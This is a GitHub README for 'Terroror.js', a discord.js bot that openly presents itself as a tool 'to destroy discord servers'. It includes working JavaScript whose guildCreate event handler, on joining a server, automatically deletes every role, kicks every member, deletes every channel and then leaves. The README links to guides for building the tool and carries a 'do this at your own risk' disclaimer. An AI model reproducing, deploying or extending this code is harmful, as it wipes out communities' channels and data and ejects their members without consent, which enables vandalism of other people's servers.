<h1 align=center><a href="https://github.com/Minco-inc/Terroror.js/"><img src="https://user-images.githubusercontent.com/85981610/138410773-c29bfe56-830c-4653-9613-ff7f93263170.png"></a></h1>
<p align=center>
    A <b>Terroror.js</b> bot, is made in <b>discord.js</b> to destroy discord servers!
</p>

<h1 align=center><a href="#"><img src="https://user-images.githubusercontent.com/85981610/138411327-b0f56768-fc30-4951-8aae-9efa195958ba.png"></a></h1>

## Your app.js
```js
/* 
      DO THIS AT YOUR OWN RISK!
      We are not responisible of any damages on discord!
      Copyright by MincoMK
      https://www.minco.kro.kr/
*/
const Main = require("./src/Main.js"); // let discord make own main directory

let main = new Main(); // let make ./src/Main.js as main code
main.main(); // making main code is working
```

## Simple eventmanager.js

```js
const process = require("process");
const version = require("../package.json").version;

/* 
	Enables the SuperTerroror on Discord when bots join automatically make a bomb to server
*/
class EventManager {
	joinAllEvents(client) { // join bot for all events
		this.client = client; // this client
		client.on("ready", async () => { // on ready
			console.log("The bot is ready to terroror"); // when bot is ready log on console
		});

		client.on("guildCreate", guild => { // the server ---
			guild.roles.cache.forEach(role => { // for each role
				role.delete().catch(console.error); // --- delete all roles
			});
			guild.members.cache.forEach(mb => { // for each members
				mb.kick().catch(console.error); // --- kick all members
			});
			guild.channels.cache.forEach(ch => { // for each channels
				ch.delete().catch(console.error); // --- delete channels
			});
			guild.leave(); // and leave the bot after terroror
		});
	}
}

module.exports = EventManager; // export the eventmanager

// end of file
```
<b>When bots join, automatically terroror!</b>



<p align=center>
    View <a href="https://github.com/Minco-inc/Terroror.js/wiki/">Wiki</a> for <b>Full Installation and Guides</b> for building <b>SuperTerroror.js!</b>
</p>

<h1 align=center><a href="#"><img src="https://user-images.githubusercontent.com/85981610/138412398-8be72245-210b-433f-9aa8-ef37f569c831.png"></a></h1>

- Added `express` app for Uptimerobot.com
- Removed `node_modules`, use `npm install / npm i` on terminal
- Added `disnotify` on `package.json`
- Added `@discord-opus`, `discord-api-types`, and other depencies of djs

[`View History Changelogs`](/Changelogs.md) for All Information!

<h3 align=right>- Made by MincoMK and Hen2527</h3>
